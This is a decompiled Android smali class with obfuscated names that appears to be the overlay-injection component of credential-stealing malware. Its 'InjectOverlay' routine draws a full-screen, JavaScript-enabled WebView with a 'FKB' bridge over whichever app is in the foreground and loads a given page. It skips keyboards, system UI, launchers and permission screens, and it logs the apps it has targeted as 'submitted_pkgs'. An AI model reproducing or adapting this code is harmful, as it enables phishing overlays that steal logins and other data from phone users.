.class public final Lڜٟٱڀ/ة;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static ث:Lڜٟٱڀ/ة;

.field public static volatile ج:Ljava/lang/String;


# instance fields
.field public ؋:Landroid/view/WindowManager;

.field public ؠ:Lڛڜڕڰڑ/أ;

.field public ء:Landroid/webkit/WebView;

.field public volatile آ:Z

.field public volatile أ:Z

.field public volatile ؤ:Z

.field public volatile إ:Z

.field public volatile ئ:Ljava/lang/String;

.field public volatile ا:Ljava/lang/String;

.field public volatile ب:Landroid/content/Context;

.field public final ة:Ljava/util/HashSet;

.field public final ت:Landroid/os/Handler;


# direct methods
.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lڜٟٱڀ/ة;->آ:Z

    iput-boolean v0, p0, Lڜٟٱڀ/ة;->أ:Z

    iput-boolean v0, p0, Lڜٟٱڀ/ة;->ؤ:Z

    iput-boolean v0, p0, Lڜٟٱڀ/ة;->إ:Z

    const-string v0, ""

    iput-object v0, p0, Lڜٟٱڀ/ة;->ئ:Ljava/lang/String;

    iput-object v0, p0, Lڜٟٱڀ/ة;->ا:Ljava/lang/String;

    new-instance v0, Ljava/util/HashSet;

    invoke-direct {v0}, Ljava/util/HashSet;-><init>()V

    iput-object v0, p0, Lڜٟٱڀ/ة;->ة:Ljava/util/HashSet;

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lڜٟٱڀ/ة;->ت:Landroid/os/Handler;

    return-void
.end method

.method public static declared-synchronized ء()Lڜٟٱڀ/ة;
    .locals 2

    const-class v0, Lڜٟٱڀ/ة;

    monitor-enter v0

    :try_start_0
    sget-object v1, Lڜٟٱڀ/ة;->ث:Lڜٟٱڀ/ة;

    if-nez v1, :cond_0

    new-instance v1, Lڜٟٱڀ/ة;

    invoke-direct {v1}, Lڜٟٱڀ/ة;-><init>()V

    sput-object v1, Lڜٟٱڀ/ة;->ث:Lڜٟٱڀ/ة;

    :cond_0
    sget-object v1, Lڜٟٱڀ/ة;->ث:Lڜٟٱڀ/ة;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    monitor-exit v0

    return-object v1

    :catchall_0
    move-exception v1

    monitor-exit v0

    throw v1
.end method

.method public static آ(Ljava/lang/String;)Z
    .locals 7

    const/4 v0, 0x1

    const/4 v1, 0x0

    :try_start_0
    sget-object v2, Lسۄھؤۏ۫/؋;->خ:Lorg/json/JSONArray;

    if-nez v2, :cond_0

    goto :goto_1

    :cond_0
    move v3, v1

    :goto_0
    invoke-virtual {v2}, Lorg/json/JSONArray;->length()I

    move-result v4

    if-ge v3, v4, :cond_2

    invoke-virtual {v2, v3}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v4

    if-eqz v4, :cond_1

    const-string v5, "used"

    invoke-virtual {v4, v5, v1}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v5

    if-eqz v5, :cond_1

    const-string v5, "pkg"

    const-string v6, ""

    invoke-virtual {v4, v5, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v4, :cond_1

    move v2, v0

    goto :goto_2

    :cond_1
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :catch_0
    :cond_2
    :goto_1
    move v2, v1

    :goto_2
    if-eqz v2, :cond_3

    return v1

    :cond_3
    const-string v2, "android.gms"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "honeyboard"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "inputmethod"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "keyboard"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "swiftkey"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "fleksy"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "gboard"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "sogou"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "baidu.input"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "tencent.qqpinyin"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "ai.type"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "systemui"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "credentialmanager"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "permissioncontroller"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "launcher"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "trebuchet"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    const-string v2, "lawnchair"

    invoke-virtual {p0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_5

    sget-object v2, Lڜٟٱڀ/ة;->ج:Ljava/lang/String;

    if-eqz v2, :cond_4

    sget-object v2, Lڜٟٱڀ/ة;->ج:Ljava/lang/String;

    invoke-virtual {p0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_4

    goto :goto_3

    :cond_4
    move v0, v1

    :cond_5
    :goto_3
    return v0
.end method


# virtual methods
.method public final ؋()V
    .locals 2

    :try_start_0
    iget-object v0, p0, Lڜٟٱڀ/ة;->ؠ:Lڛڜڕڰڑ/أ;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lڜٟٱڀ/ة;->؋:Landroid/view/WindowManager;

    if-eqz v0, :cond_0

    iget-boolean v0, p0, Lڜٟٱڀ/ة;->آ:Z

    if-eqz v0, :cond_0

    iget-object v0, p0, Lڜٟٱڀ/ة;->؋:Landroid/view/WindowManager;

    iget-object v1, p0, Lڜٟٱڀ/ة;->ؠ:Lڛڜڕڰڑ/أ;

    invoke-interface {v0, v1}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    const/4 v0, 0x0

    :try_start_1
    iget-object v1, p0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;

    if-eqz v1, :cond_1

    invoke-virtual {v1}, Landroid/webkit/WebView;->stopLoading()V

    iget-object v1, p0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->destroy()V

    iput-object v0, p0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_1
    iput-object v0, p0, Lڜٟٱڀ/ة;->ؠ:Lڛڜڕڰڑ/أ;

    const/4 v0, 0x0

    iput-boolean v0, p0, Lڜٟٱڀ/ة;->آ:Z

    iput-boolean v0, p0, Lڜٟٱڀ/ة;->أ:Z

    return-void
.end method

.method public final ؠ(Landroid/content/Context;Ljava/lang/String;)V
    .locals 9

    iget-object v0, p0, Lڜٟٱڀ/ة;->ؠ:Lڛڜڕڰڑ/أ;

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Lڜٟٱڀ/ة;->؋()V

    :cond_0
    const/4 v0, 0x0

    :try_start_0
    const-string v1, "window"

    invoke-virtual {p1, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    iput-object v1, p0, Lڜٟٱڀ/ة;->؋:Landroid/view/WindowManager;

    new-instance v1, Lڛڜڕڰڑ/أ;

    const/4 v2, 0x1

    invoke-direct {v1, p0, p1, v2}, Lڛڜڕڰڑ/أ;-><init>(Ljava/lang/Object;Landroid/content/Context;I)V

    iput-object v1, p0, Lڜٟٱڀ/ة;->ؠ:Lڛڜڕڰڑ/أ;

    const/4 v3, -0x1

    invoke-virtual {v1, v3}, Landroid/view/View;->setBackgroundColor(I)V

    iget-object v1, p0, Lڜٟٱڀ/ة;->ؠ:Lڛڜڕڰڑ/أ;

    invoke-virtual {v1, v2}, Landroid/view/View;->setFocusable(Z)V

    iget-object v1, p0, Lڜٟٱڀ/ة;->ؠ:Lڛڜڕڰڑ/أ;

    invoke-virtual {v1, v2}, Landroid/view/View;->setFocusableInTouchMode(Z)V

    iget-object v1, p0, Lڜٟٱڀ/ة;->ؠ:Lڛڜڕڰڑ/أ;

    const/16 v4, 0x1700

    invoke-virtual {v1, v4}, Landroid/view/View;->setSystemUiVisibility(I)V

    new-instance v1, Landroid/webkit/WebView;

    invoke-direct {v1, p1}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;

    const/4 v4, 0x0

    invoke-virtual {v1, v0, v4}, Landroid/webkit/WebView;->setLayerType(ILandroid/graphics/Paint;)V

    iget-object v1, p0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;

    invoke-virtual {v1, v3}, Landroid/webkit/WebView;->setBackgroundColor(I)V

    iget-object v1, p0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;

    invoke-virtual {v1, v2}, Landroid/view/View;->setFocusable(Z)V

    iget-object v1, p0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;

    invoke-virtual {v1, v2}, Landroid/view/View;->setFocusableInTouchMode(Z)V

    iget-object v1, p0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setDatabaseEnabled(Z)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    invoke-virtual {v1, v3}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setSupportZoom(Z)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    invoke-virtual {v1, v0}, Landroid/webkit/WebSettings;->setDisplayZoomControls(Z)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    invoke-virtual {v1, v0}, Landroid/webkit/WebSettings;->setMixedContentMode(I)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptCanOpenWindowsAutomatically(Z)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V

    invoke-virtual {v1, v0}, Landroid/webkit/WebSettings;->setMediaPlaybackRequiresUserGesture(Z)V

    invoke-virtual {v1, v0}, Landroid/webkit/WebSettings;->setNeedInitialFocus(Z)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setLoadsImagesAutomatically(Z)V

    iget-object v1, p0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;

    new-instance v4, Lڜٟٱڀ/ب;

    invoke-direct {v4, p0}, Lڜٟٱڀ/ب;-><init>(Lڜٟٱڀ/ة;)V

    const-string v5, "FKB"

    invoke-virtual {v1, v4, v5}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    iget-object v1, p0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;

    new-instance v4, Lڛەٟہ/ا;

    const/4 v5, 0x2

    invoke-direct {v4, v5, p0}, Lڛەٟہ/ا;-><init>(ILjava/lang/Object;)V

    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    iget-object v1, p0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;

    new-instance v4, Landroid/webkit/WebChromeClient;

    invoke-direct {v4}, Landroid/webkit/WebChromeClient;-><init>()V

    invoke-virtual {v1, v4}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    iget-object v1, p0, Lڜٟٱڀ/ة;->ؠ:Lڛڜڕڰڑ/أ;

    iget-object v4, p0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;

    new-instance v5, Landroid/widget/FrameLayout$LayoutParams;

    invoke-direct {v5, v3, v3}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v1, v4, v5}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    iget-object v1, p0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;

    new-instance v3, Lڜٟٱڀ/ا;

    invoke-direct {v3, p1}, Lڜٟٱڀ/ا;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, v3}, Landroid/view/View;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-static {p1}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_1

    const/16 p1, 0x7f6

    goto :goto_0

    :cond_1
    const/16 p1, 0x7f0

    :goto_0
    move v6, p1

    iget-object p1, p0, Lڜٟٱڀ/ة;->؋:Landroid/view/WindowManager;

    invoke-interface {p1}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object p1

    new-instance v3, Landroid/util/DisplayMetrics;

    invoke-direct {v3}, Landroid/util/DisplayMetrics;-><init>()V

    invoke-virtual {p1, v3}, Landroid/view/Display;->getRealMetrics(Landroid/util/DisplayMetrics;)V

    iget v4, v3, Landroid/util/DisplayMetrics;->widthPixels:I

    iget v5, v3, Landroid/util/DisplayMetrics;->heightPixels:I

    iget-boolean p1, p0, Lڜٟٱڀ/ة;->إ:Z

    if-eqz p1, :cond_2

    const/16 p1, 0x720

    goto :goto_1

    :cond_2
    const/16 p1, 0x120

    :goto_1
    move v7, p1

    new-instance p1, Landroid/view/WindowManager$LayoutParams;

    const/4 v8, -0x3

    move-object v3, p1

    invoke-direct/range {v3 .. v8}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    const v3, 0x800033

    iput v3, p1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    iput v0, p1, Landroid/view/WindowManager$LayoutParams;->x:I

    iput v0, p1, Landroid/view/WindowManager$LayoutParams;->y:I

    iput v0, p1, Landroid/view/WindowManager$LayoutParams;->windowAnimations:I

    const/16 v3, 0x13

    iput v3, p1, Landroid/view/WindowManager$LayoutParams;->softInputMode:I

    const/16 v3, 0x1c

    if-lt v1, v3, :cond_3

    invoke-static {p1}, Landroidx/core/view/accessibility/؋;->ت(Landroid/view/WindowManager$LayoutParams;)V

    :cond_3
    iget-object v1, p0, Lڜٟٱڀ/ة;->؋:Landroid/view/WindowManager;

    iget-object v3, p0, Lڜٟٱڀ/ة;->ؠ:Lڛڜڕڰڑ/أ;

    invoke-interface {v1, v3, p1}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    iput-boolean v2, p0, Lڜٟٱڀ/ة;->آ:Z

    iput-boolean v0, p0, Lڜٟٱڀ/ة;->أ:Z

    iget-object p1, p0, Lڜٟٱڀ/ة;->ء:Landroid/webkit/WebView;

    invoke-virtual {p1, p2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    move-exception p1

    const-string p2, "InjectOverlay"

    const-string v1, "doShow error"

    invoke-static {p2, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    iput-boolean v0, p0, Lڜٟٱڀ/ة;->آ:Z

    :goto_2
    return-void
.end method

.method public final أ()V
    .locals 5

    iget-object v0, p0, Lڜٟٱڀ/ة;->ب:Landroid/content/Context;

    if-nez v0, :cond_0

    return-void

    :cond_0
    :try_start_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lڜٟٱڀ/ة;->ة:Ljava/util/HashSet;

    invoke-virtual {v2}, Ljava/util/HashSet;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_2

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->length()I

    move-result v4

    if-lez v4, :cond_1

    const-string v4, ","

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_1
    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_0

    :cond_2
    const-string v2, "inject_state"

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v2, "submitted_pkgs"

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public final declared-synchronized ؤ(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Z)V
    .locals 7

    monitor-enter p0

    :try_start_0
    iget-boolean v0, p0, Lڜٟٱڀ/ة;->آ:Z

    if-eqz v0, :cond_1

    iget-object v0, p0, Lڜٟٱڀ/ة;->ئ:Ljava/lang/String;

    invoke-virtual {p3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    iget-object p1, p0, Lڜٟٱڀ/ة;->ا:Ljava/lang/String;

    invoke-virtual {p2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz p1, :cond_0

    monitor-exit p0

    return-void

    :cond_0
    :try_start_1
    iput-object p2, p0, Lڜٟٱڀ/ة;->ا:Ljava/lang/String;

    iput-boolean p4, p0, Lڜٟٱڀ/ة;->إ:Z

    iget-object p1, p0, Lڜٟٱڀ/ة;->ت:Landroid/os/Handler;

    new-instance p3, Landroidx/constraintlayout/motion/widget/؋;

    const/16 p4, 0x19

    invoke-direct {p3, p4, p0, p2}, Landroidx/constraintlayout/motion/widget/؋;-><init>(ILjava/lang/Object;Ljava/lang/Object;)V

    invoke-virtual {p1, p3}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    monitor-exit p0

    return-void

    :cond_1
    :try_start_2
    iput-object p3, p0, Lڜٟٱڀ/ة;->ئ:Ljava/lang/String;

    iput-boolean p4, p0, Lڜٟٱڀ/ة;->إ:Z

    const/4 p4, 0x0

    iput-boolean p4, p0, Lڜٟٱڀ/ة;->ؤ:Z

    iput-boolean p4, p0, Lڜٟٱڀ/ة;->أ:Z

    iput-object p2, p0, Lڜٟٱڀ/ة;->ا:Ljava/lang/String;

    const/4 p4, 0x1

    iput-boolean p4, p0, Lڜٟٱڀ/ة;->آ:Z

    invoke-static {}, Landroid/os/Looper;->myLooper()Landroid/os/Looper;

    move-result-object p4

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v0

    if-ne p4, v0, :cond_2

    invoke-virtual {p0, p1, p2}, Lڜٟٱڀ/ة;->ؠ(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0

    :cond_2
    iget-object p4, p0, Lڜٟٱڀ/ة;->ت:Landroid/os/Handler;

    new-instance v6, Landroidx/work/impl/ء;

    const/4 v5, 0x2

    move-object v0, v6

    move-object v1, p0

    move-object v2, p1

    move-object v3, p2

    move-object v4, p3

    invoke-direct/range {v0 .. v5}, Landroidx/work/impl/ء;-><init>(Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;I)V

    invoke-virtual {p4, v6}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :goto_0
    monitor-exit p0

    return-void

    :catchall_0
    move-exception p1

    monitor-exit p0

    throw p1
.end method
